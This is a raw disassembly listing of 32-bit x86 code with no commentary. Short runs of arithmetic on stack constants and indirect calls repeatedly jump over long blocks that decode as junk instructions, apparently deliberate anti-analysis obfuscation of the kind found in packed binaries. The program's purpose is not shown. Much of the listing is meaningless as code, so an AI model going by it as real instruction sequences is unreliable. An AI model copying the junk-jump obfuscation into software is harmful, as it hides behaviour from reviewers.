  40f75e:	mov    cl,0xe5
  40f760:	hlt    
  40f761:	fwait
  40f762:	sbb    DWORD PTR [esi+0x69adab7c],ebx
  40f768:	pop    ds
  40f769:	xchg   esi,eax
  40f76a:	xlat   BYTE PTR ds:[ebx]
  40f76b:	pop    ss
  40f76c:	xor    al,dl
  40f76e:	push   eax
  40f76f:	cmp    BYTE PTR [ebp+0x28a865c2],ch
  40f775:	adc    BYTE PTR ds:0x6dd1be07,0xfc
  40f77c:	adc    eax,0xf87b0b31
  40f781:	rol    BYTE PTR [edi+0x25a8fb65],cl
  40f787:	jno    0x40f77e
  40f789:	arpl   sp,di
  40f78b:	call   0x23ef:0xaedb2298
  40f792:	dec    edi
  40f793:	(bad)  
  40f794:	push   ss
  40f795:	xchg   ebp,edi
  40f797:	sbb    BYTE PTR gs:[ebx+0x33],0xe2
  40f79c:	(bad)  
  40f79d:	and    al,0x6e
  40f79f:	pop    es
  40f7a0:	jb     0x40f7c5
  40f7a2:	std    
  40f7a3:	mov    edi,0xdfdc6bc5
  40f7a8:	mov    DWORD PTR [edi+eax*1+0x68],esi
  40f7ac:	cld    
  40f7ad:	fsub   DWORD PTR [edi+0x42]
  40f7b0:	mov    ch,0xea
  40f7b2:	aaa    
  40f7b3:	push   esp
  40f7b4:	xchg   ebx,eax
  40f7b5:	dec    esp
  40f7b6:	or     al,BYTE PTR [ebp+0x4818ab4c]
  40f7bc:	cmc    
  40f7bd:	cmp    DWORD PTR [esi],0x31
  40f7c0:	popa   
  40f7c1:	mov    bh,0xae
  40f7c3:	push   es
  40f7c4:	pop    edi
  40f7c5:	call   0x1e8116c7
  40f7ca:	in     al,0xc1
  40f7cc:	out    dx,al
  40f7cd:	loop   0x40f7d6
  40f7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7d0:	lahf   
  40f7d1:	add    al,0x51
  40f7d3:	(bad)  
  40f7d4:	fcom   DWORD PTR [edx+esi*4]
  40f7d7:	cmp    ebp,DWORD PTR [ebx+eax*1]
  40f7da:	mov    DWORD PTR [ebp-0x34],0x6145
  40f7e1:	mov    DWORD PTR [ebp-0x2c],0x70d5
  40f7e8:	mov    DWORD PTR [ebp-0x1c],0x268
  40f7ef:	mov    DWORD PTR [ebp-0x20],0x5f10
  40f7f6:	mov    DWORD PTR [ebp-0x24],0x727c
  40f7fd:	mov    DWORD PTR [ebp-0x28],0x4fa5
  40f804:	xor    edi,0x5418
  40f80a:	mov    eax,DWORD PTR [ebp-0x28]
  40f80d:	mov    ecx,DWORD PTR [ebp-0x24]
  40f810:	cmp    DWORD PTR ds:0x42f64c,0x0
  40f817:	jbe    0x40f836
  40f81d:	jmp    0x40f836
  40f822:	push   DWORD PTR [ebp-0x14]
  40f825:	push   DWORD PTR [ebp-0x10]
  40f828:	push   DWORD PTR [ebp-0x10]
  40f82b:	push   0x3aa1
  40f830:	call   DWORD PTR ds:0x4387b8
  40f836:	or     eax,ecx
  40f838:	mov    ecx,DWORD PTR [ebp-0x20]
  40f83b:	or     eax,0x3948
  40f840:	imul   eax,eax,0x6524
  40f846:	xor    eax,ecx
  40f848:	jmp    0x40f924
  40f84d:	pop    ebp
  40f84e:	iret   
  40f84f:	lods   al,BYTE PTR ds:[esi]
  40f850:	jle    0x40f810
  40f852:	jg     0x40f833
  40f854:	out    dx,eax
  40f855:	into   
  40f856:	add    bl,bl
  40f858:	dec    esi
  40f859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f85a:	dec    BYTE PTR [ecx]
  40f85c:	pop    edi
  40f85d:	or     esp,DWORD PTR [edi+0xbf0000]
  40f863:	add    BYTE PTR [eax],al
  40f865:	pop    ecx
  40f866:	and    edx,ebp
  40f868:	daa    
  40f869:	inc    esp
  40f86a:	or     al,0x34
  40f86c:	out    dx,al
  40f86d:	and    DWORD PTR [edi-0x43],ecx
  40f870:	jae    0x40f880
  40f872:	xchg   esi,eax
  40f873:	js     0x40f861
  40f875:	cmp    eax,0xb3605f3f
  40f87a:	lods   al,BYTE PTR ds:[esi]
  40f87b:	fstp   TBYTE PTR [edi+eiz*4]
  40f87e:	call   0xb07b9cb8
  40f883:	dec    eax
  40f884:	or     eax,0x7e63a64f
  40f889:	ret    0x17b7
  40f88c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f88d:	fidivr DWORD PTR [eax+0x7eb8dccc]
  40f893:	shl    ebx,cl
  40f895:	add    BYTE PTR [eax],dl
  40f897:	push   edx
  40f898:	inc    esi
  40f899:	inc    eax
  40f89a:	loopne 0x40f84a
  40f89c:	les    esp,FWORD PTR [ebx]
  40f89e:	js     0x40f91d
  40f8a0:	retf   0xc73
  40f8a3:	sub    al,BYTE PTR [ebx+0x24b04c5f]
  40f8a9:	and    eax,DWORD PTR [esi-0x2d]
  40f8ac:	jl     0x40f909
  40f8ae:	lahf   
  40f8af:	mov    al,ds:0xcb55e437
  40f8b4:	ins    DWORD PTR es:[edi],dx
  40f8b5:	cli    
  40f8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8b7:	stos   BYTE PTR es:[edi],al
  40f8b8:	call   0xb4d6:0x71a61068
  40f8bf:	loopne 0x40f8fe
  40f8c1:	(bad)  [ecx+esi*8+0x4507a523]
  40f8c8:	retf   
  40f8c9:	(bad)  
  40f8ca:	loopne 0x40f8ad
  40f8cc:	mov    bl,0xd9
  40f8ce:	and    eax,0x3cd54090
  40f8d3:	mov    bl,0xbb
  40f8d5:	ss fwait
  40f8d7:	inc    ebp
  40f8d8:	mov    ds:0xe14a4217,eax
  40f8dd:	pop    es
  40f8de:	dec    esi
  40f8df:	stos   BYTE PTR es:[edi],al
  40f8e0:	push   ebx
  40f8e1:	adc    al,0xdc
  40f8e3:	add    ecx,ecx
  40f8e5:	adc    eax,0x61b5543f
  40f8ea:	ins    DWORD PTR es:[edi],dx
  40f8eb:	fwait
  40f8ec:	and    eax,DWORD PTR [edx-0xd03ebea]
  40f8f2:	push   ss
  40f8f3:	push   cs
  40f8f4:	adc    eax,0xa3400d55
  40f8f9:	jp     0x40f8e8
  40f8fb:	cmp    ebp,DWORD PTR ds:0x7a28ed48
  40f901:	xor    ah,BYTE PTR [ecx]
  40f903:	hlt    
  40f904:	push   ebx
  40f905:	div    ecx
  40f907:	jge    0x40f96e
  40f909:	es aam 0xcf
  40f90c:	leavew 
  40f90e:	(bad)  
  40f90f:	xchg   esi,eax
  40f910:	inc    BYTE PTR es:[edi]
  40f913:	sbb    edx,DWORD PTR [eax]
  40f915:	out    dx,al
  40f916:	mov    eax,0xd1633fb8
  40f91b:	clc    
  40f91c:	and    eax,0xdff78ee5
  40f921:	push   ecx
  40f922:	add    al,0x5
  40f924:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f927:	imul   eax,ecx
  40f92a:	jmp    0x40fa06
  40f92f:	cdq    
  40f930:	pop    eax
  40f931:	pop    ss
  40f932:	(bad)  
  40f934:	(bad)  
  40f936:	pop    eax
  40f937:	xchg   edi,eax
  40f938:	push   0xffffffb3
  40f93a:	ficom  WORD PTR [esi]
  40f93c:	lock ror ch,1
  40f93f:	retf   0xa7
  40f942:	add    BYTE PTR [edi+0x69000000],bh
  40f948:	test   eax,0xda4ea31c
  40f94d:	iret   
  40f94e:	inc    ebx
  40f94f:	outs   dx,BYTE PTR ds:[esi]
  40f950:	mov    ecx,0x88a25378
  40f955:	jns    0x40f98b
  40f957:	repz fnsave [edi+0x21]
  40f95b:	(bad)  
  40f95c:	cli    
  40f95d:	arpl   WORD PTR [ebx-0x24a5e7d1],dx
  40f963:	push   ds
  40f964:	inc    eax
  40f965:	dec    esi
  40f966:	or     DWORD PTR [edx+edx*1],ebp
  40f969:	push   ss
  40f96a:	cli    
  40f96b:	(bad)  
  40f96c:	jle    0x40f968
  40f96e:	and    BYTE PTR [ebx],dl
  40f970:	adc    DWORD PTR [edx-0x5],edi
  40f973:	inc    ecx
  40f974:	sahf   
  40f975:	into   
  40f976:	or     BYTE PTR [edi+0x7f1fc97e],bl
  40f97c:	mov    edx,0xf845e85c
  40f981:	outs   dx,DWORD PTR ds:[esi]
  40f982:	stos   BYTE PTR es:[edi],al
  40f983:	and    al,0xcb
  40f985:	jp     0x40f9e8
  40f987:	bound  ecx,QWORD PTR [ebx*8+0x1450c05d]
  40f98e:	fist   DWORD PTR [esi]
  40f990:	in     al,0x5e
  40f992:	addr16 es inc esp
  40f995:	stc    
  40f996:	xchg   ebp,eax
  40f997:	ret    
  40f998:	mov    al,BYTE PTR [ebx-0x1f5a015e]
  40f99e:	mov    eax,ds:0x3a49493
  40f9a3:	mov    ds:0xa5c4faaa,al
  40f9a8:	dec    eax
  40f9a9:	sub    BYTE PTR [esi],bl
  40f9ab:	repnz sbb BYTE PTR [esi+0x5d],0x48
  40f9b0:	les    ebp,FWORD PTR [edx+0x3b15d1e3]
  40f9b6:	sbb    ebx,DWORD PTR [ecx]
  40f9b8:	sbb    dl,BYTE PTR [edx]
  40f9ba:	adc    esi,ecx
  40f9bc:	pop    ecx
  40f9bd:	jmp    0x84b9:0x234dacd7
  40f9c4:	jbe    0x40fa3e
  40f9c6:	repnz cmp eax,DWORD PTR [ecx-0x73]
  40f9ca:	mov    ebx,0xb8b35186
  40f9cf:	xchg   ebp,eax
  40f9d0:	mov    bl,0xd4
  40f9d2:	cmp    DWORD PTR [esi+0x4a],esp
  40f9d5:	and    edi,eax
  40f9d7:	rcl    DWORD PTR [esp+ecx*2+0x632430ff],1
  40f9de:	out    0xaa,eax
  40f9e0:	xor    DWORD PTR [esi-0x19],esp
  40f9e3:	sbb    BYTE PTR [ebx+0xd2c92a4],dl
  40f9e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ea:	inc    ecx
  40f9eb:	push   ecx
  40f9ec:	test   al,0x6e
  40f9ee:	in     al,0x71
  40f9f0:	aas    
  40f9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9f2:	int    0x48
  40f9f4:	pusha  
  40f9f5:	stos   BYTE PTR es:[edi],al
  40f9f6:	mov    bh,0x34
  40f9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f9:	rol    DWORD PTR [edi],cl
  40f9fb:	add    BYTE PTR [eax-0x71],cl
  40f9fe:	mov    dl,0xa3
  40fa00:	pop    edi
  40fa01:	fcom   QWORD PTR [ecx+0x358ef475]
  40fa07:	mov    al,ds:0x3abd955
  40fa0c:	inc    ebp
  40fa0d:	cld    
  40fa0e:	mov    edi,DWORD PTR ds:0x42c010
  40fa14:	mov    ecx,DWORD PTR ds:0x42c01c
  40fa1a:	sub    edi,ecx
  40fa1c:	or     edi,DWORD PTR [edi+ecx*1]
  40fa1f:	mov    DWORD PTR [ebp-0x4],eax
  40fa22:	or     edx,edx
  40fa24:	mov    eax,DWORD PTR [ebp-0x2c]
  40fa27:	sub    edx,edx
  40fa29:	imul   eax,eax,0xbe
  40fa2f:	jmp    0x40fb0b
  40fa34:	stos   BYTE PTR es:[edi],al
  40fa35:	jl     0x40f9e4
  40fa37:	mov    esp,0x7ebbfdff
  40fa3c:	mov    cl,0xe7
  40fa3e:	push   esi
  40fa3f:	pop    edi
  40fa40:	test   eax,0x8902ddd4
  40fa45:	test   al,0x0
  40fa47:	add    BYTE PTR [edi-0x60000000],bh
  40fa4d:	lods   al,BYTE PTR ds:[esi]
  40fa4e:	sbb    DWORD PTR [ecx+0x19],ebp
  40fa51:	push   edi
  40fa52:	push   ss
  40fa53:	mov    ecx,DWORD PTR ds:0xeb7ad726
  40fa59:	xchg   ebx,eax
  40fa5a:	mov    dh,0x59
  40fa5c:	push   esi
  40fa5d:	hlt    
  40fa5e:	and    eax,DWORD PTR ds:0xdbec84b4
  40fa64:	inc    ebx
  40fa65:	pop    esi
  40fa66:	lahf   
  40fa67:	test   al,0x7f
  40fa69:	mov    eax,0xe23c0fbc
  40fa6e:	(bad)  
  40fa70:	push   ebx
  40fa71:	aam    0x53
  40fa73:	push   ebx
  40fa74:	rcr    BYTE PTR [edx+eax*2+0x208860f7],0xbd
  40fa7c:	dec    DWORD PTR [ecx-0xa]
  40fa7f:	xlat   BYTE PTR ds:[ebx]
  40fa80:	mov    al,ds:0x60e708d0
  40fa85:	sbb    edx,DWORD PTR [edi+edi*2]
  40fa88:	(bad)  
  40fa8a:	lds    ebx,FWORD PTR [eax]
  40fa8c:	mov    esp,0xfea42111
  40fa91:	mov    BYTE PTR [ebp+0x9],dh
  40fa94:	pusha  
  40fa95:	and    al,0xb2
  40fa97:	or     al,0x40
  40fa99:	repz add bh,BYTE PTR [esi-0x59246aea]
  40faa0:	in     eax,dx
  40faa1:	mov    dl,0x2a
  40faa3:	mov    edx,DWORD PTR [ebp+0xc6f3848]
  40faa9:	jge    0x40fa49
  40faab:	jae    0x40fa86
  40faad:	test   DWORD PTR [ebx+0x1d],edi
  40fab0:	nop
  40fab1:	cld    
  40fab2:	shl    ch,0x35
  40fab5:	inc    eax
  40fab6:	gs std 
  40fab8:	or     esp,edx
  40faba:	cld    
  40fabb:	jp     0x40faa8
  40fabd:	clc    
  40fabe:	pop    esi
  40fabf:	xchg   dh,dh
  40fac1:	out    0xcf,al
  40fac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fac4:	ins    DWORD PTR es:[edi],dx
  40fac5:	gs dec edx
  40fac7:	xchg   ebp,eax
  40fac8:	retf   
  40fac9:	sub    dl,BYTE PTR [eax+0x46fd371]
  40facf:	nop
  40fad0:	and    bh,BYTE PTR [ecx-0x6a6c228d]
  40fad6:	push   esi
  40fad7:	pop    ebp
  40fad8:	dec    ebp
  40fad9:	int3   
  40fada:	push   esi
  40fadb:	dec    ebp
  40fadc:	shl    DWORD PTR [eax+edi*1+0x3c],cl
  40fae0:	mov    al,0xee
  40fae2:	jno    0x40fad3
  40fae4:	int3   
  40fae5:	mov    DWORD PTR [edi+0x7ac11648],ecx
  40faeb:	les    ebp,FWORD PTR [edi+edx*4+0x2f15149e]
  40faf2:	idiv   DWORD PTR [edi+0x47]
  40faf5:	gs push 0x47
  40faf8:	imul   esp,DWORD PTR [esi],0x4d1f9f43
  40fafe:	cmp    DWORD PTR [eax+0x4819ffe0],ebp
  40fb04:	mov    ds:0xa76aea52,al
  40fb09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb0a:	fisttp WORD PTR ds:0x7023
  40fb10:	xor    edx,edx
  40fb12:	or     edx,DWORD PTR ds:0x42e038
  40fb18:	mov    edx,DWORD PTR [edx]
  40fb1a:	add    DWORD PTR ds:0x42f628,edx
  40fb20:	add    eax,DWORD PTR [ebp-0x34]
  40fb23:	mov    ecx,DWORD PTR ds:0x42f6a8
  40fb29:	mov    edx,DWORD PTR ds:0x42f6dc
  40fb2f:	sub    ecx,edx
  40fb31:	xor    ecx,DWORD PTR [ecx+edx*1]
  40fb34:	jmp    0x40fc10
  40fb39:	push   es
  40fb3a:	xchg   ebp,eax
  40fb3b:	mov    cl,0x51
  40fb3d:	mov    bl,0x75
  40fb3f:	out    0xd7,al
  40fb41:	data16 cmp ch,BYTE PTR [esi]
  40fb44:	fimul  WORD PTR [eax+0x48337f87]
  40fb4a:	test   eax,0xbf0000
  40fb4f:	add    BYTE PTR [eax],al
  40fb51:	enter  0x1f1a,0xbe
  40fb55:	inc    edx
  40fb56:	pushf  
  40fb57:	(bad)  
  40fb58:	push   edx
  40fb59:	rcr    DWORD PTR ds:0x55447af,cl
  40fb5f:	lahf   
  40fb60:	jg     0x40fb01
  40fb62:	pop    esp
  40fb63:	dec    edi
  40fb64:	push   es
  40fb65:	pop    edx
  40fb66:	arpl   WORD PTR [eax+0xd],cx
  40fb69:	mov    gs,WORD PTR [ecx-0x65f103c6]
  40fb6f:	std    
  40fb70:	dec    esp
  40fb71:	mov    esp,0xf57c8b9c
  40fb76:	dec    eax
  40fb77:	repz mov dh,0xca
  40fb7a:	sbb    cl,bl
  40fb7c:	int3   
  40fb7d:	sbb    BYTE PTR [edx+0x30],cl
  40fb80:	nop
  40fb81:	add    BYTE PTR [edi+ecx*8],0xc1
  40fb85:	add    BYTE PTR [eax],dl
  40fb87:	push   eax
  40fb88:	or     esp,DWORD PTR [ebp+ebx*8-0x7060b8d1]
  40fb8f:	fucom  st(2)
  40fb91:	test   DWORD PTR fs:[edi+eiz*1-0x34b3fbbf],edx
  40fb99:	test   bh,dh
  40fb9b:	and    eax,DWORD PTR [esi]
  40fb9d:	out    0xea,al
  40fb9f:	fcomp  DWORD PTR [eax-0x6be8882a]
  40fba5:	adc    ebx,DWORD PTR [edx-0x3a]
  40fba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba9:	xor    esp,edx
  40fbab:	xor    eax,0x51a1fef0
  40fbb0:	or     al,0xc6
  40fbb2:	xor    al,0x4c
  40fbb4:	jge    0x40fc02
  40fbb6:	push   cs
  40fbb7:	fdivr  st(5),st
  40fbb9:	jbe    0x40fb96
  40fbbb:	jl     0x40fb45
  40fbbd:	xor    ebx,DWORD PTR [eax-0x15]
  40fbc0:	loopne 0x40fb71
  40fbc2:	mov    fs,WORD PTR [edi-0x28]
  40fbc5:	mov    bh,0x7a
  40fbc7:	in     eax,0x9
  40fbc9:	(bad)  
  40fbca:	mov    esi,0x30cf3de3
  40fbcf:	mov    edx,0x59051c4b
  40fbd4:	lahf   
  40fbd5:	jecxz  0x40fbc5
  40fbd7:	dec    edi
  40fbd8:	pop    ebp
  40fbd9:	mov    ah,0x25
  40fbdb:	hlt    
  40fbdc:	sub    DWORD PTR ds:0x53fb5637,ebp
  40fbe2:	out    0x23,al
  40fbe4:	inc    esi
  40fbe5:	lea    esi,[ecx-0x3d]
  40fbe8:	js     0x40fc67
  40fbea:	daa    
  40fbeb:	or     al,0xe1
  40fbed:	lea    edi,[edx]
  40fbef:	jg     0x40fc0d
  40fbf1:	and    DWORD PTR [eax-0x16],ebp
  40fbf4:	jno    0x40fc2e
  40fbf6:	lds    eax,FWORD PTR [ecx-0x3e]
  40fbf9:	cmp    DWORD PTR [ecx-0x6],ecx
  40fbfc:	rcr    BYTE PTR [edx+eax*1],cl
  40fbff:	leave  
  40fc00:	jecxz  0x40fc65
  40fc02:	and    ecx,esi
  40fc04:	or     edx,ebp
  40fc06:	(bad)  
  40fc07:	lods   al,BYTE PTR ds:[esi]
  40fc08:	inc    edx
  40fc09:	mov    eax,ds:0xbdb138b7
  40fc0e:	lock mov edi,0x3c44d8b
  40fc14:	(bad)  
  40fc15:	and    eax,ecx
  40fc17:	or     eax,0x86
  40fc1c:	jmp    0x40fcf8
  40fc21:	jp     0x40fbce
  40fc23:	xor    BYTE PTR [ebx-0x404440f],ah
  40fc29:	outs   dx,DWORD PTR ds:[esi]
  40fc2a:	mov    ecx,0xe2e567f1
  40fc2f:	not    DWORD PTR [edx+0xaa07]
  40fc35:	mov    edi,0x7000000
  40fc3a:	xor    eax,0x1814a5b4
  40fc3f:	loop   0x40fcba
  40fc41:	dec    esp
  40fc42:	dec    ebp
  40fc43:	daa    
  40fc44:	push   esi
  40fc45:	adc    eax,0x4209ce91
  40fc4a:	xor    DWORD PTR [ebx],eax
  40fc4c:	add    BYTE PTR [esi+0x20],cl
  40fc4f:	pop    esp
  40fc50:	xchg   ecx,eax
  40fc51:	xor    al,0x8e
  40fc53:	test   eax,0xe97d5165
  40fc58:	cmp    DWORD PTR [eax-0x60cd2b89],edx
  40fc5e:	aad    0xb2
  40fc60:	sahf   
  40fc61:	sar    BYTE PTR [ecx],1
  40fc63:	xor    DWORD PTR [edi],0x5e
  40fc66:	xlat   BYTE PTR ds:[ebx]
  40fc67:	jbe    0x40fc26
  40fc69:	jne    0x40fc2e
  40fc6b:	xor    cl,BYTE PTR [edx]
  40fc6d:	add    DWORD PTR ds:0x67e28a7a,ebx
  40fc73:	(bad)  
  40fc74:	pop    edx
  40fc75:	jecxz  0x40fc45
  40fc77:	jb     0x40fc0d
  40fc79:	jnp    0x40fcce
  40fc7b:	pop    ebp
  40fc7c:	pop    ss
  40fc7d:	int    0x5
  40fc7f:	xor    al,0x14
  40fc81:	xor    esp,ebx
  40fc83:	or     dh,BYTE PTR [eax]
  40fc85:	jp     0x40fc62
  40fc87:	jge    0x40fc11
  40fc89:	clc    
  40fc8a:	loopne 0x40fc16
  40fc8c:	sub    ecx,edx
  40fc8e:	aas    
  40fc8f:	push   ds
  40fc90:	sub    BYTE PTR [eax+0x5be34338],dl
  40fc96:	shl    ebp,0x86
  40fc99:	xchg   ecx,eax
  40fc9a:	and    al,0x9b
  40fc9c:	hlt    
  40fc9d:	mov    ebx,0xa7da9a0f
  40fca2:	adc    al,0xaf
  40fca4:	jmp    FWORD PTR [esi]
  40fca6:	ret    0xfe97
  40fca9:	xchg   ebx,eax
  40fcaa:	mov    fs,WORD PTR [ecx-0x14196b79]
  40fcb0:	inc    edx
  40fcb1:	xchg   esp,eax
  40fcb2:	ret    0x96bb
  40fcb5:	hlt    
  40fcb6:	fdivr  DWORD PTR [ecx-0x5e]
  40fcb9:	fs dec esi
  40fcbb:	jmp    0xaf2e9833
  40fcc0:	scas   al,BYTE PTR es:[edi]
  40fcc1:	(bad)  
  40fcc2:	mov    dh,0xe8
  40fcc5:	jle    0x40fc54
  40fcc7:	lods   eax,DWORD PTR ds:[esi]
  40fcc8:	push   0x1a
  40fcca:	xchg   esi,eax
  40fccb:	leave  
  40fccc:	add    bh,dl
  40fcce:	bound  eax,QWORD PTR [ebx+0x72]
  40fcd1:	mov    ds:0xf57a0576,eax
  40fcd6:	sar    al,0x77
  40fcd9:	jnp    0x40fc72
  40fcdb:	and    DWORD PTR [ebp+0x5bcdd8c9],ebx
  40fce1:	sti    
  40fce2:	cmp    dh,bh
  40fce4:	lahf   
  40fce5:	adc    ch,BYTE PTR [ecx-0x4b]
  40fce8:	add    esp,DWORD PTR [ebx-0x1695e569]
  40fcee:	rcl    BYTE PTR [ecx+0x3c63cd67],1
  40fcf4:	sbb    DWORD PTR [ebx],esp
  40fcf6:	cdq    
  40fcf7:	ss xor eax,0x50e6
  40fcfd:	mov    edi,DWORD PTR ds:0x42f6d4
  40fd03:	mov    edi,DWORD PTR [edi]
  40fd05:	adc    DWORD PTR ds:0x42f544,edi
  40fd0b:	add    eax,DWORD PTR [ebp+0x8]
  40fd0e:	mov    DWORD PTR [ebp-0x30],0xebeb4fd3
  40fd15:	cmp    DWORD PTR ds:0x42f604,0x0
  40fd1c:	jg     0x40fd30
  40fd22:	jmp    0x40fd30
  40fd27:	push   DWORD PTR [ebp-0x10]
  40fd2a:	call   DWORD PTR ds:0x4387e8
  40fd30:	mov    DWORD PTR [ebp-0x3c],eax
  40fd33:	mov    eax,0xffffdedc
  40fd38:	jmp    0x40fe14
  40fd3d:	ror    BYTE PTR [ebx],0x6a
  40fd40:	enter  0xe9eb,0xe2
  40fd44:	or     ebx,DWORD PTR [edi+ebx*8-0x12e9b180]
  40fd4b:	cs je  0x40fd14
  40fd4e:	stos   BYTE PTR es:[edi],al
  40fd4f:	add    BYTE PTR [eax],al
  40fd51:	mov    edi,0x60000000
  40fd56:	iret   
  40fd57:	bound  ecx,QWORD PTR [esi]
  40fd59:	arpl   WORD PTR [eax-0x61],si
  40fd5c:	int3   
  40fd5d:	test   al,0x8b
  40fd5f:	das    
  40fd60:	and    al,0x6f
  40fd62:	jae    0x40fd5c
  40fd64:	adc    eax,ebp
  40fd66:	mov    DWORD PTR ds:0x47219df,ecx
  40fd6c:	dec    ecx
  40fd6d:	sahf   
  40fd6e:	mov    bl,0x7d
  40fd70:	xor    BYTE PTR [ebx],bh
  40fd72:	inc    esp
  40fd73:	aam    0x9c
  40fd75:	lahf   
  40fd76:	and    eax,0x16a69102
  40fd7b:	scas   eax,DWORD PTR es:[edi]
  40fd7c:	add    ebx,ecx
  40fd7e:	add    DWORD PTR [ebx],ebx
  40fd80:	cdq    
  40fd81:	lea    edx,[edi]
  40fd83:	pop    ebx
  40fd84:	and    eax,0xbe914b01
  40fd89:	mov    esi,0xc8643397
  40fd8e:	sub    BYTE PTR [edx-0x52],bh
  40fd91:	adc    eax,DWORD PTR [eax-0x19]
  40fd94:	(bad)  
  40fd96:	fucomp st(5)
  40fd98:	push   es
  40fd99:	lahf   
  40fd9a:	and    BYTE PTR [eax-0x44],0x60
  40fd9e:	mov    ebp,0x86708ef7
  40fda3:	push   eax
  40fda4:	sub    al,0xc6
  40fda6:	out    dx,eax
  40fda7:	ja     0x40fd3e
  40fda9:	(bad)  
  40fdaa:	std    
  40fdab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdac:	cmp    al,al
  40fdae:	repnz push eax
  40fdb0:	jno    0x40fdd8
  40fdb2:	mov    WORD PTR [eax+esi*4],gs
  40fdb5:	jl     0x40fde7
  40fdb7:	sbb    BYTE PTR ss:[edi+0x3b35bd9c],cl
  40fdbe:	sub    al,0x26
  40fdc0:	mov    edx,0xc8df9dd6
  40fdc5:	pop    esi
  40fdc6:	stc    
  40fdc7:	pushf  
  40fdc8:	add    al,BYTE PTR [esi-0x78a0fe3e]
  40fdce:	xor    BYTE PTR [eax+0x237314d3],dh
  40fdd4:	mov    eax,0x939ee803
  40fdd9:	or     al,0x38
  40fddb:	(bad)  
  40fddc:	call   0x6908:0x2e52c45f
  40fde3:	pop    ebp
  40fde4:	mov    bl,0x25
  40fde6:	inc    edx
  40fde7:	mov    DWORD PTR [edx+0x72440871],edx
  40fded:	outs   dx,DWORD PTR ds:[esi]
  40fdee:	call   0x457636d1
  40fdf3:	fsubr  st(5),st
  40fdf5:	add    cl,BYTE PTR [ebx]
  40fdf7:	xor    ah,bh
  40fdf9:	lock inc ebx
  40fdfb:	or     bl,ch
  40fdfd:	ret    0xcebe
  40fe00:	jmp    0x40fda2
  40fe02:	push   esi
  40fe03:	mov    bh,BYTE PTR [esi+0x66]
  40fe06:	push   0xf
  40fe08:	pusha  
  40fe09:	sub    al,0x34
  40fe0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe0c:	mov    DWORD PTR [ebx-0x117f3fe8],edx
  40fe12:	jbe    0x40fdf3
  40fe14:	mov    DWORD PTR [ebp-0x2c],eax
  40fe17:	mov    DWORD PTR [ebp-0x38],0xebeb4fd4
  40fe1e:	mov    DWORD PTR [ebp-0x34],eax
  40fe21:	jmp    0x40fefd
  40fe26:	push   ebx
  40fe27:	push   eax
  40fe28:	and    edx,edx
  40fe2a:	and    esi,ebx
  40fe2c:	repz rcl DWORD PTR [ebp-0xf],1
  40fe30:	push   esi
  40fe31:	jp     0x40fdfa
  40fe33:	shl    bh,0xbf
  40fe36:	test   DWORD PTR [ebx+0xbf0000],ebp
  40fe3c:	add    BYTE PTR [eax],al
  40fe3e:	pop    esi
  40fe3f:	xor    DWORD PTR ds:0x51dea941,eax
  40fe45:	cmc    
  40fe46:	gs (bad) 
  40fe48:	icebp  
  40fe49:	jmp    0x3f8e9901
  40fe4e:	retf   0xe755
  40fe51:	mov    ds,WORD PTR ds:0xf0079233
  40fe57:	sub    DWORD PTR [edx+0x7d],edx
  40fe5a:	mov    ah,0xfa
  40fe5c:	in     eax,dx
  40fe5d:	int    0x4b
  40fe5f:	fiadd  DWORD PTR [ebx*1+0x4a1324ff]
  40fe66:	mov    DWORD PTR [ebp-0x3ed134c2],ebx
  40fe6c:	(bad)  
  40fe6d:	jge    0x40fe83
  40fe6f:	sbb    DWORD PTR [edi-0x6dfe5c16],esp
  40fe75:	jmp    FWORD PTR [eax+eax*8+0xecbd412]
  40fe7c:	push   0xd8a5eb6c
  40fe81:	pop    eax
  40fe82:	mov    ebp,0xf78428b7
  40fe87:	std    
  40fe88:	(bad)  [ebx-0x6c]
  40fe8b:	jo     0x40fe86
  40fe8d:	retf   
  40fe8e:	mov    al,0x7d
  40fe90:	mov    dl,0x6c
  40fe92:	xchg   DWORD PTR [esi*2-0x76c082c7],eax
  40fe99:	and    eax,0x9b6dfbb1
  40fe9e:	inc    edi
  40fe9f:	sbb    eax,0xd2a01822
  40fea4:	or     al,0x42
  40fea6:	mov    bh,0xa5
  40fea8:	pusha  
  40fea9:	mov    bh,0x17
  40feab:	(bad)  
  40feac:	in     eax,dx
  40fead:	test   bh,0xba
  40feb0:	repz mov esp,0xc6270407
  40feb6:	xchg   edx,eax
  40feb7:	lods   eax,DWORD PTR ds:[esi]
  40feb8:	gs pop ecx
  40feba:	adc    BYTE PTR [ebx-0x65],dh
  40febd:	xchg   ebx,ebp
  40febf:	pop    eax
  40fec0:	fdiv   DWORD PTR [edi+0x3e6459e4]
  40fec6:	mov    ds,WORD PTR [ebx+ecx*4-0x9eeef53]
  40fecd:	cmc    
  40fece:	adc    eax,0x9f5837d9
  40fed3:	sbb    BYTE PTR [ecx-0x46],0xc1
  40fed7:	cmp    al,0x6b
  40fed9:	xchg   DWORD PTR [edx+0x63a87d88],esp
  40fedf:	fnsave [edx+0x1269544f]
  40fee5:	adc    eax,0x187a7404
  40feea:	(bad)  
  40feeb:	gs sbb al,0x59
  40feee:	dec    eax
  40feef:	jl     0x40fed5
  40fef1:	push   ecx
  40fef2:	fs cmc 
  40fef4:	sbb    DWORD PTR [ecx-0x58],edi
  40fef7:	jae    0x40ff1f
  40fef9:	push   ds
  40fefa:	sbb    BYTE PTR [edx-0x37aa74b4],al
  40ff00:	mov    ecx,DWORD PTR [ebp-0x34]
  40ff03:	sbb    DWORD PTR ds:0x42f5b0,edi
  40ff09:	mov    esi,DWORD PTR [ebp-0x30]
  40ff0c:	mov    edi,DWORD PTR [ebp-0x2c]
  40ff0f:	mov    ecx,0x8dacd260
  40ff14:	xor    edx,ecx
